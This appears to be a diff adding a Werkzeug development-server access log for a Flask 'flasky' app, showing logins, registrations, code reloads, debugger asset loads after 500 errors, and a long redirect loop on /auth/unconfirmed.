+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 14:17:09] "POST /auth/login?next=%2Fauth%2Fchange-password HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 14:17:21] "POST /auth/login?next=%2Fauth%2Fchange-password HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 14:17:21] "GET /auth/change-password HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/root/flasky/app/models.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug:119.146.68.16 - - [16/Dec/2019 15:18:16] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:157.55.39.20 - - [16/Dec/2019 15:23:52] "GET /robots.txt HTTP/1.1" 404 -
+INFO:werkzeug:157.55.39.20 - - [16/Dec/2019 15:23:56] "GET /robots.txt HTTP/1.1" 404 -
+INFO:werkzeug:157.55.39.109 - - [16/Dec/2019 15:23:58] "GET / HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/root/flasky/app/models.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug: * Detected change in '/root/flasky/app/main/__init__.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:41:11] "GET /auth/login HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:41:11] "GET /static/favicon.ico HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:41:16] "POST /auth/login HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:41:18] "POST /auth/login HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:41:18] "GET / HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:41:18] "GET /auth/unconfirmed HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:41:24] "GET / HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:41:24] "GET /auth/unconfirmed HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:41:25] "GET / HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:41:25] "GET /auth/unconfirmed HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:41:25] "GET / HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:41:25] "GET /auth/unconfirmed HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:41:26] "GET / HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:41:26] "GET /auth/unconfirmed HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:41:26] "GET / HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:41:26] "GET /auth/unconfirmed HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:41:27] "GET / HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:41:27] "GET /auth/unconfirmed HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:43:21] "GET /auth/logout HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:43:21] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:43:23] "GET /auth/login HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:43:24] "GET /auth/register HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:43:36] "POST /auth/register HTTP/1.1" 500 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:43:36] "GET /auth/register?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:43:36] "GET /auth/register?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:43:36] "GET /auth/register?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:43:37] "GET /auth/register?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:43:37] "GET /auth/register?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:43:38] "GET /auth/register?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+ERROR:root:Error: Directory migrations already exists and is not empty
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:45:01] "POST /auth/register HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:45:01] "GET /auth/login HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:45:22] "POST /auth/login HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:45:22] "GET / HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 15:45:23] "GET /auth/unconfirmed HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/root/flasky/app/models.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:11:19] "GET /auth/login HTTP/1.1" 500 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:11:19] "GET /auth/login?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:11:19] "GET /auth/login?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:11:19] "GET /auth/login?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:11:20] "GET /auth/login?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:11:20] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:11:20] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+ERROR:root:Error: Directory migrations already exists and is not empty
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:11:58] "GET /auth/login HTTP/1.1" 500 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:11:58] "GET /auth/login?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:11:58] "GET /auth/login?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:11:58] "GET /auth/login?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:11:58] "GET /auth/login?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:11:58] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:11:59] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/root/flasky/app/auth/views.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/login HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:20] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:26] "GET /auth/login HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:26] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:26] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:26] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:26] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:26] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:26] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:26] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:26] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:26] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:26] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:26] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:26] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:26] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:26] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:26] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:26] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:26] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:26] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:13:26] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:14:22] "GET / HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:14:22] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:14:22] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:14:22] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:14:22] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:14:23] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:14:23] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:14:23] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:14:23] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:14:23] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:14:23] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:14:23] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:14:23] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:14:23] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:14:23] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:14:23] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:14:23] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:14:23] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:14:23] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:14:23] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:15:06] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:15:06] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:15:06] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:15:06] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:15:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:15:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:15:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:15:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:15:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:15:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:15:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:15:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:15:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:15:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:15:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:15:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:15:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:15:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:15:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:15:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:16:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:16:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:16:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:16:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:16:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:16:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:16:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:16:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:16:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:16:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:16:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:16:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:16:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:16:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:16:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:16:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:16:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:16:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:16:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:16:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:21:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:21:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:21:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:21:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:21:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:21:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:21:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:21:07] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:21:08] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:21:08] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:21:08] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:21:08] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:21:08] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:21:08] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:21:08] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:21:08] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:21:08] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:21:08] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:21:08] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:21:08] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug: * Detected change in '/root/flasky/app/auth/views.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:23:54] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:23:54] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:23:54] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:23:54] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:23:54] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:23:54] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:23:54] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:23:54] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:23:54] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:23:54] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:23:54] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:23:54] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:23:54] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:23:54] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:23:54] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:23:54] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:23:54] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:23:54] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:23:54] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:23:54] "GET /auth/unconfirmed HTTP/1.1" 302 -
+INFO:werkzeug: * Detected change in '/root/flasky/app/auth/views.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:27:32] "GET /auth/unconfirmed HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:27:33] "GET /static/favicon.ico HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:27:37] "GET /auth/login HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/root/flasky/app/main/views.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:45:22] "GET /auth/login HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:45:22] "GET /static/favicon.ico HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:45:23] "GET /auth/login HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:45:23] "GET /static/favicon.ico HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:45:49] "GET /auth/login HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:45:49] "GET /static/favicon.ico HTTP/1.1" 200 -
